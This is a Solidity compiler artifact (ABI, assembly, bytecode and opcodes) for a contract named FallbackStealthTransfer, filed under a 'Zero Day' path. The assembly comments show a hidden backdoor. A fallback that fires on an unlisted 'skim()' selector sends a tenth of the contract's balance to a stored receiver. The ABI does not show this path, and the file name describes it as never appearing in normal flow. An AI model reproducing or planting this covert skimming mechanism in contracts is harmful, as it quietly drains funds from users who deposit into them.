{
	"W/Zero Day/drips 10 percent on fallback hit never appear in normal flow FallbackStealthTransfer.sol": {
		"FallbackStealthTransfer": {
			"abi": [
				{
					"inputs": [
						{
							"internalType": "address payable",
							"name": "_receiver",
							"type": "address"
						}
					],
					"stateMutability": "nonpayable",
					"type": "constructor"
				},
				{
					"stateMutability": "payable",
					"type": "fallback"
				},
				{
					"inputs": [],
					"name": "receiver",
					"outputs": [
						{
							"internalType": "address payable",
							"name": "",
							"type": "address"
						}
					],
					"stateMutability": "view",
					"type": "function"
				}
			],
			"devdoc": {
				"kind": "dev",
				"methods": {},
				"version": 1
			},
			"evm": {
				"assembly": "    /* \"W/Zero Day/drips 10 percent on fallback hit never appear in normal flow FallbackStealthTransfer.sol\":0:338  contract FallbackStealthTransfer {... */\n  mstore(0x40, 0x80)\n    /* \"W/Zero Day/drips 10 percent on fallback hit never appear in normal flow FallbackStealthTransfer.sol\":77:153  constructor(address payable _receiver) {... */\n  callvalue\n  dup1\n  iszero\n  tag_1\n  jumpi\n  0x00\n  dup1\n  revert\ntag_1:\n  pop\n  mload(0x40)\n  sub(codesize, bytecodeSize)\n  dup1\n  bytecodeSize\n  dup4\n  codecopy\n  dup2\n  dup2\n  add\n  0x40\n  mstore\n  dup2\n  add\n  swap1\n  tag_2\n  swap2\n  swap1\n  tag_3\n  jump\t// in\ntag_2:\n    /* \"W/Zero Day/drips 10 percent on fallback hit never appear in normal flow FallbackStealthTransfer.sol\":137:146  _receiver */\n  dup1\n    /* \"W/Zero Day/drips 10 percent on fallback hit never appear in normal flow FallbackStealthTransfer.sol\":126:134  receiver */\n  0x00\n  dup1\n    /* \"W/Zero Day/drips 10 percent on fallback hit never appear in normal flow FallbackStealthTransfer.sol\":126:146  receiver = _receiver */\n  0x0100\n  exp\n  dup2\n  sload\n  dup2\n  0xffffffffffffffffffffffffffffffffffffffff\n  mul\n  not\n  and\n  swap1\n  dup4\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n  mul\n  or\n  swap1\n  sstore\n  pop\n    /* \"W/Zero Day/drips 10 percent on fallback hit never appear in normal flow FallbackStealthTransfer.sol\":77:153  constructor(address payable _receiver) {... */\n  pop\n    /* \"W/Zero Day/drips 10 percent on fallback hit never appear in normal flow FallbackStealthTransfer.sol\":0:338  contract FallbackStealthTransfer {... */\n  jump(tag_6)\n    /* \"#utility.yul\":88:205   */\ntag_8:\n    /* \"#utility.yul\":197:198   */\n  0x00\n    /* \"#utility.yul\":194:195   */\n  dup1\n    /* \"#utility.yul\":187:199   */\n  revert\n    /* \"#utility.yul\":334:460   */\ntag_10:\n    /* \"#utility.yul\":371:378   */\n  0x00\n    /* \"#utility.yul\":411:453   */\n  0xffffffffffffffffffffffffffffffffffffffff\n    /* \"#utility.yul\":404:409   */\n  dup3\n    /* \"#utility.yul\":400:454   */\n  and\n    /* \"#utility.yul\":389:454   */\n  swap1\n  pop\n    /* \"#utility.yul\":334:460   */\n  swap2\n  swap1\n  pop\n  jump\t// out\n    /* \"#utility.yul\":466:570   */\ntag_11:\n    /* \"#utility.yul\":511:518   */\n  0x00\n    /* \"#utility.yul\":540:564   */\n  tag_20\n    /* \"#utility.yul\":558:563   */\n  dup3\n    /* \"#utility.yul\":540:564   */\n  tag_10\n  jump\t// in\ntag_20:\n    /* \"#utility.yul\":529:564   */\n  swap1\n  pop\n    /* \"#utility.yul\":466:570   */\n  swap2\n  swap1\n  pop\n  jump\t// out\n    /* \"#utility.yul\":576:714   */\ntag_12:\n    /* \"#utility.yul\":657:689   */\n  tag_22\n    /* \"#utility.yul\":683:688   */\n  dup2\n    /* \"#utility.yul\":657:689   */\n  tag_11\n  jump\t// in\ntag_22:\n    /* \"#utility.yul\":650:655   */\n  dup2\n    /* \"#utility.yul\":647:690   */\n  eq\n    /* \"#utility.yul\":637:708   */\n  tag_23\n  jumpi\n    /* \"#utility.yul\":704:705   */\n  0x00\n    /* \"#utility.yul\":701:702   */\n  dup1\n    /* \"#utility.yul\":694:706   */\n  revert\n    /* \"#utility.yul\":637:708   */\ntag_23:\n    /* \"#utility.yul\":576:714   */\n  pop\n  jump\t// out\n    /* \"#utility.yul\":720:879   */\ntag_13:\n    /* \"#utility.yul\":785:790   */\n  0x00\n    /* \"#utility.yul\":816:822   */\n  dup2\n    /* \"#utility.yul\":810:823   */\n  mload\n    /* \"#utility.yul\":801:823   */\n  swap1\n  pop\n    /* \"#utility.yul\":832:873   */\n  tag_25\n    /* \"#utility.yul\":867:872   */\n  dup2\n    /* \"#utility.yul\":832:873   */\n  tag_12\n  jump\t// in\ntag_25:\n    /* \"#utility.yul\":720:879   */\n  swap3\n  swap2\n  pop\n  pop\n  jump\t// out\n    /* \"#utility.yul\":885:1252   */\ntag_3:\n    /* \"#utility.yul\":963:969   */\n  0x00\n    /* \"#utility.yul\":1012:1014   */\n  0x20\n    /* \"#utility.yul\":1000:1009   */\n  dup3\n    /* \"#utility.yul\":991:998   */\n  dup5\n    /* \"#utility.yul\":987:1010   */\n  sub\n    /* \"#utility.yul\":983:1015   */\n  slt\n    /* \"#utility.yul\":980:1099   */\n  iszero\n  tag_27\n  jumpi\n    /* \"#utility.yul\":1018:1097   */\n  tag_28\n  tag_8\n  jump\t// in\ntag_28:\n    /* \"#utility.yul\":980:1099   */\ntag_27:\n    /* \"#utility.yul\":1138:1139   */\n  0x00\n    /* \"#utility.yul\":1163:1235   */\n  tag_29\n    /* \"#utility.yul\":1227:1234   */\n  dup5\n    /* \"#utility.yul\":1218:1224   */\n  dup3\n    /* \"#utility.yul\":1207:1216   */\n  dup6\n    /* \"#utility.yul\":1203:1225   */\n  add\n    /* \"#utility.yul\":1163:1235   */\n  tag_13\n  jump\t// in\ntag_29:\n    /* \"#utility.yul\":1153:1235   */\n  swap2\n  pop\n    /* \"#utility.yul\":1109:1245   */\n  pop\n    /* \"#utility.yul\":885:1252   */\n  swap3\n  swap2\n  pop\n  pop\n  jump\t// out\n    /* \"W/Zero Day/drips 10 percent on fallback hit never appear in normal flow FallbackStealthTransfer.sol\":0:338  contract FallbackStealthTransfer {... */\ntag_6:\n  dataSize(sub_0)\n  dup1\n  dataOffset(sub_0)\n  0x00\n  codecopy\n  0x00\n  return\nstop\n\nsub_0: assembly {\n        /* \"W/Zero Day/drips 10 percent on fallback hit never appear in normal flow FallbackStealthTransfer.sol\":0:338  contract FallbackStealthTransfer {... */\n      mstore(0x40, 0x80)\n      jumpi(tag_1, lt(calldatasize, 0x04))\n      shr(0xe0, calldataload(0x00))\n      dup1\n      0xf7260d3e\n      eq\n      tag_3\n      jumpi\n      jump(tag_2)\n    tag_1:\n    tag_2:\n        /* \"W/Zero Day/drips 10 percent on fallback hit never appear in normal flow FallbackStealthTransfer.sol\":219:238  keccak256(\"skim()\") */\n      0x1dd19cb4e35c980e19f4a4f552c9690d2e6b25e14ca01824b4189fda30c28ca4\n        /* \"W/Zero Day/drips 10 percent on fallback hit never appear in normal flow FallbackStealthTransfer.sol\":201:239  msg.sig == bytes4(keccak256(\"skim()\")) */\n      not(0xffffffffffffffffffffffffffffffffffffffffffffffffffffffff)\n      and\n        /* \"W/Zero Day/drips 10 percent on fallback hit never appear in normal flow FallbackStealthTransfer.sol\":201:208  msg.sig */\n      and(0xffffffff00000000000000000000000000000000000000000000000000000000, calldataload(0x00))\n        /* \"W/Zero Day/drips 10 percent on fallback hit never appear in normal flow FallbackStealthTransfer.sol\":201:239  msg.sig == bytes4(keccak256(\"skim()\")) */\n      not(0xffffffffffffffffffffffffffffffffffffffffffffffffffffffff)\n      and\n      sub\n        /* \"W/Zero Day/drips 10 percent on fallback hit never appear in normal flow FallbackStealthTransfer.sol\":197:330  if (msg.sig == bytes4(keccak256(\"skim()\"))) {... */\n      tag_6\n      jumpi\n        /* \"W/Zero Day/drips 10 percent on fallback hit never appear in normal flow FallbackStealthTransfer.sol\":255:263  receiver */\n      0x00\n      dup1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"W/Zero Day/drips 10 percent on fallback hit never appear in normal flow FallbackStealthTransfer.sol\":255:272  receiver.transfer */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"W/Zero Day/drips 10 percent on fallback hit never appear in normal flow FallbackStealthTransfer.sol\":255:300  receiver.transfer(address(this).balance / 10) */\n      0x08fc\n        /* \"W/Zero Day/drips 10 percent on fallback hit never appear in normal flow FallbackStealthTransfer.sol\":297:299  10 */\n      0x0a\n        /* \"W/Zero Day/drips 10 percent on fallback hit never appear in normal flow FallbackStealthTransfer.sol\":273:294  address(this).balance */\n      selfbalance\n        /* \"W/Zero Day/drips 10 percent on fallback hit never appear in normal flow FallbackStealthTransfer.sol\":273:299  address(this).balance / 10 */\n      tag_7\n      swap2\n      swap1\n      tag_8\n      jump\t// in\n    tag_7:\n        /* \"W/Zero Day/drips 10 percent on fallback hit never appear in normal flow FallbackStealthTransfer.sol\":255:300  receiver.transfer(address(this).balance / 10) */\n      swap1\n      dup2\n      iszero\n      mul\n      swap1\n      mload(0x40)\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      dup6\n      dup9\n      dup9\n      call\n      swap4\n      pop\n      pop\n      pop\n      pop\n      iszero\n      dup1\n      iszero\n      tag_10\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_10:\n      pop\n        /* \"W/Zero Day/drips 10 percent on fallback hit never appear in normal flow FallbackStealthTransfer.sol\":197:330  if (msg.sig == bytes4(keccak256(\"skim()\"))) {... */\n    tag_6:\n        /* \"W/Zero Day/drips 10 percent on fallback hit never appear in normal flow FallbackStealthTransfer.sol\":0:338  contract FallbackStealthTransfer {... */\n      stop\n        /* \"W/Zero Day/drips 10 percent on fallback hit never appear in normal flow FallbackStealthTransfer.sol\":39:70  address payable public receiver */\n    tag_3:\n      callvalue\n      dup1\n      iszero\n      tag_11\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_11:\n      pop\n      tag_12\n      tag_13\n      jump\t// in\n    tag_12:\n      mload(0x40)\n      tag_14\n      swap2\n      swap1\n      tag_15\n      jump\t// in\n    tag_14:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n    tag_13:\n      0x00\n      dup1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      jump\t// out\n        /* \"#utility.yul\":7:84   */\n    tag_16:\n        /* \"#utility.yul\":44:51   */\n      0x00\n        /* \"#utility.yul\":73:78   */\n      dup2\n        /* \"#utility.yul\":62:78   */\n      swap1\n      pop\n        /* \"#utility.yul\":7:84   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":90:270   */\n    tag_17:\n        /* \"#utility.yul\":138:215   */\n      0x4e487b7100000000000000000000000000000000000000000000000000000000\n        /* \"#utility.yul\":135:136   */\n      0x00\n        /* \"#utility.yul\":128:216   */\n      mstore\n        /* \"#utility.yul\":235:239   */\n      0x12\n        /* \"#utility.yul\":232:233   */\n      0x04\n        /* \"#utility.yul\":225:240   */\n      mstore\n        /* \"#utility.yul\":259:263   */\n      0x24\n        /* \"#utility.yul\":256:257   */\n      0x00\n        /* \"#utility.yul\":249:264   */\n      revert\n        /* \"#utility.yul\":462:647   */\n    tag_8:\n        /* \"#utility.yul\":502:503   */\n      0x00\n        /* \"#utility.yul\":519:539   */\n      tag_27\n        /* \"#utility.yul\":537:538   */\n      dup3\n        /* \"#utility.yul\":519:539   */\n      tag_16\n      jump\t// in\n    tag_27:\n        /* \"#utility.yul\":514:539   */\n      swap2\n      pop\n        /* \"#utility.yul\":553:573   */\n      tag_28\n        /* \"#utility.yul\":571:572   */\n      dup4\n        /* \"#utility.yul\":553:573   */\n      tag_16\n      jump\t// in\n    tag_28:\n        /* \"#utility.yul\":548:573   */\n      swap3\n      pop\n        /* \"#utility.yul\":592:593   */\n      dup3\n        /* \"#utility.yul\":582:617   */\n      tag_29\n      jumpi\n        /* \"#utility.yul\":597:615   */\n      tag_30\n      tag_17\n      jump\t// in\n    tag_30:\n        /* \"#utility.yul\":582:617   */\n    tag_29:\n        /* \"#utility.yul\":639:640   */\n      dup3\n        /* \"#utility.yul\":636:637   */\n      dup3\n        /* \"#utility.yul\":632:641   */\n      div\n        /* \"#utility.yul\":627:641   */\n      swap1\n      pop\n        /* \"#utility.yul\":462:647   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":653:779   */\n    tag_19:\n        /* \"#utility.yul\":690:697   */\n      0x00\n        /* \"#utility.yul\":730:772   */\n      0xffffffffffffffffffffffffffffffffffffffff\n        /* \"#utility.yul\":723:728   */\n      dup3\n        /* \"#utility.yul\":719:773   */\n      and\n        /* \"#utility.yul\":708:773   */\n      swap1\n      pop\n        /* \"#utility.yul\":653:779   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":785:889   */\n    tag_20:\n        /* \"#utility.yul\":830:837   */\n      0x00\n        /* \"#utility.yul\":859:883   */\n      tag_33\n        /* \"#utility.yul\":877:882   */\n      dup3\n        /* \"#utility.yul\":859:883   */\n      tag_19\n      jump\t// in\n    tag_33:\n        /* \"#utility.yul\":848:883   */\n      swap1\n      pop\n        /* \"#utility.yul\":785:889   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":895:1037   */\n    tag_21:\n        /* \"#utility.yul\":998:1030   */\n      tag_35\n        /* \"#utility.yul\":1024:1029   */\n      dup2\n        /* \"#utility.yul\":998:1030   */\n      tag_20\n      jump\t// in\n    tag_35:\n        /* \"#utility.yul\":993:996   */\n      dup3\n        /* \"#utility.yul\":986:1031   */\n      mstore\n        /* \"#utility.yul\":895:1037   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1043:1297   */\n    tag_15:\n        /* \"#utility.yul\":1152:1156   */\n      0x00\n        /* \"#utility.yul\":1190:1192   */\n      0x20\n        /* \"#utility.yul\":1179:1188   */\n      dup3\n        /* \"#utility.yul\":1175:1193   */\n      add\n        /* \"#utility.yul\":1167:1193   */\n      swap1\n      pop\n        /* \"#utility.yul\":1203:1290   */\n      tag_37\n        /* \"#utility.yul\":1287:1288   */\n      0x00\n        /* \"#utility.yul\":1276:1285   */\n      dup4\n        /* \"#utility.yul\":1272:1289   */\n      add\n        /* \"#utility.yul\":1263:1269   */\n      dup5\n        /* \"#utility.yul\":1203:1290   */\n      tag_21\n      jump\t// in\n    tag_37:\n        /* \"#utility.yul\":1043:1297   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n\n    auxdata: 0xa2646970667358221220ff6f7a675d1971c73f74bfc31bc44f7b0ad8566fc1d10e77e9dc140607d1cf2e64736f6c634300081a0033\n}\n",
				"bytecode": {
					"linkReferences": {},
					"object": "608060405234801561000f575f80fd5b50604051610369380380610369833981810160405281019061003191906100d4565b805f806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550506100ff565b5f80fd5b5f73ffffffffffffffffffffffffffffffffffffffff82169050919050565b5f6100a38261007a565b9050919050565b6100b381610099565b81146100bd575f80fd5b50565b5f815190506100ce816100aa565b92915050565b5f602082840312156100e9576100e8610076565b5b5f6100f6848285016100c0565b91505092915050565b61025d8061010c5f395ff3fe608060405260043610610021575f3560e01c8063f7260d3e1461011c57610022565b5b7f1dd19cb4e35c980e19f4a4f552c9690d2e6b25e14ca01824b4189fda30c28ca47bffffffffffffffffffffffffffffffffffffffffffffffffffffffff19165f357fffffffff00000000000000000000000000000000000000000000000000000000167bffffffffffffffffffffffffffffffffffffffffffffffffffffffff19160361011a575f8054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166108fc600a476100f0919061019f565b90811502906040515f60405180830381858888f19350505050158015610118573d5f803e3d5ffd5b505b005b348015610127575f80fd5b50610130610146565b60405161013d919061020e565b60405180910390f35b5f8054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b5f819050919050565b7f4e487b71000000000000000000000000000000000000000000000000000000005f52601260045260245ffd5b5f6101a982610169565b91506101b483610169565b9250826101c4576101c3610172565b5b828204905092915050565b5f73ffffffffffffffffffffffffffffffffffffffff82169050919050565b5f6101f8826101cf565b9050919050565b610208816101ee565b82525050565b5f6020820190506102215f8301846101ff565b9291505056fea2646970667358221220ff6f7a675d1971c73f74bfc31bc44f7b0ad8566fc1d10e77e9dc140607d1cf2e64736f6c634300081a0033",
					"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0xF JUMPI PUSH0 DUP1 REVERT JUMPDEST POP PUSH1 0x40 MLOAD PUSH2 0x369 CODESIZE SUB DUP1 PUSH2 0x369 DUP4 CODECOPY DUP2 DUP2 ADD PUSH1 0x40 MSTORE DUP2 ADD SWAP1 PUSH2 0x31 SWAP2 SWAP1 PUSH2 0xD4 JUMP JUMPDEST DUP1 PUSH0 DUP1 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP POP PUSH2 0xFF JUMP JUMPDEST PUSH0 DUP1 REVERT JUMPDEST PUSH0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0xA3 DUP3 PUSH2 0x7A JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0xB3 DUP2 PUSH2 0x99 JUMP JUMPDEST DUP2 EQ PUSH2 0xBD JUMPI PUSH0 DUP1 REVERT JUMPDEST POP JUMP JUMPDEST PUSH0 DUP2 MLOAD SWAP1 POP PUSH2 0xCE DUP2 PUSH2 0xAA JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0xE9 JUMPI PUSH2 0xE8 PUSH2 0x76 JUMP JUMPDEST JUMPDEST PUSH0 PUSH2 0xF6 DUP5 DUP3 DUP6 ADD PUSH2 0xC0 JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH2 0x25D DUP1 PUSH2 0x10C PUSH0 CODECOPY PUSH0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x4 CALLDATASIZE LT PUSH2 0x21 JUMPI PUSH0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0xF7260D3E EQ PUSH2 0x11C JUMPI PUSH2 0x22 JUMP JUMPDEST JUMPDEST PUSH32 0x1DD19CB4E35C980E19F4A4F552C9690D2E6B25E14CA01824B4189FDA30C28CA4 PUSH28 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF NOT AND PUSH0 CALLDATALOAD PUSH32 0xFFFFFFFF00000000000000000000000000000000000000000000000000000000 AND PUSH28 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF NOT AND SUB PUSH2 0x11A JUMPI PUSH0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH2 0x8FC PUSH1 0xA SELFBALANCE PUSH2 0xF0 SWAP2 SWAP1 PUSH2 0x19F JUMP JUMPDEST SWAP1 DUP2 ISZERO MUL SWAP1 PUSH1 0x40 MLOAD PUSH0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 DUP9 DUP9 CALL SWAP4 POP POP POP POP ISZERO DUP1 ISZERO PUSH2 0x118 JUMPI RETURNDATASIZE PUSH0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH0 REVERT JUMPDEST POP JUMPDEST STOP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x127 JUMPI PUSH0 DUP1 REVERT JUMPDEST POP PUSH2 0x130 PUSH2 0x146 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x13D SWAP2 SWAP1 PUSH2 0x20E JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 JUMP JUMPDEST PUSH0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH0 MSTORE PUSH1 0x12 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH0 REVERT JUMPDEST PUSH0 PUSH2 0x1A9 DUP3 PUSH2 0x169 JUMP JUMPDEST SWAP2 POP PUSH2 0x1B4 DUP4 PUSH2 0x169 JUMP JUMPDEST SWAP3 POP DUP3 PUSH2 0x1C4 JUMPI PUSH2 0x1C3 PUSH2 0x172 JUMP JUMPDEST JUMPDEST DUP3 DUP3 DIV SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0x1F8 DUP3 PUSH2 0x1CF JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x208 DUP2 PUSH2 0x1EE JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x221 PUSH0 DUP4 ADD DUP5 PUSH2 0x1FF JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 SELFDESTRUCT PUSH16 0x7A675D1971C73F74BFC31BC44F7B0AD8 JUMP PUSH16 0xC1D10E77E9DC140607D1CF2E64736F6C PUSH4 0x4300081A STOP CALLER "
				},
				"gasEstimates": {
					"creation": {
						"codeDepositCost": "121000",
						"executionCost": "infinite",
						"totalCost": "infinite"
					},
					"external": {
						"": "infinite",
						"receiver()": "2483"
					}
				},
				"methodIdentifiers": {
					"receiver()": "f7260d3e"
				}
			},
			"storageLayout": {
				"storage": [
					{
						"astId": 2,
						"contract": "W/Zero Day/drips 10 percent on fallback hit never appear in normal flow FallbackStealthTransfer.sol:FallbackStealthTransfer",
						"label": "receiver",
						"offset": 0,
						"slot": "0",
						"type": "t_address_payable"
					}
				],
				"types": {
					"t_address_payable": {
						"encoding": "inplace",
						"label": "address payable",
						"numberOfBytes": "20"
					}
				}
			},
			"userdoc": {
				"kind": "user",
				"methods": {},
				"version": 1
			}
		}
	}
}